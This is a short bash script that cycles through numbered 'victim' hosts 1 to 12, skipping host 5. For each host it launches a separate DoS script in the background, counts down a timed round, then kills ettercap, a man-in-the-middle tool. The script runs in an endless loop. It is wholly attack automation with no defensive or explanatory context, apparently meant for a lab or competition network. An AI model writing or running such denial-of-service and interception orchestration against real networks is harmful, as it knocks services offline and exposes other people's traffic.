#!/bin/bash
if [ ! -z "$1" ] ; then
    ROUNDTIME=$((30+$1))
else
    ROUNDTIME=60
fi


counter()
{
    for i in $( seq $1 -1 1 )
    do
        echo "[+] victim $2 , $i second(s) left"
        sleep 1
    done
}

while :
do
    for i in $( seq 1 1 12 )
    do
        if [ $i == 5 ] ; then
            continue
        fi
        /root/DoS/AutoDoS.sh $i &
        counter $ROUNDTIME $i
        killall ettercap
    done
done
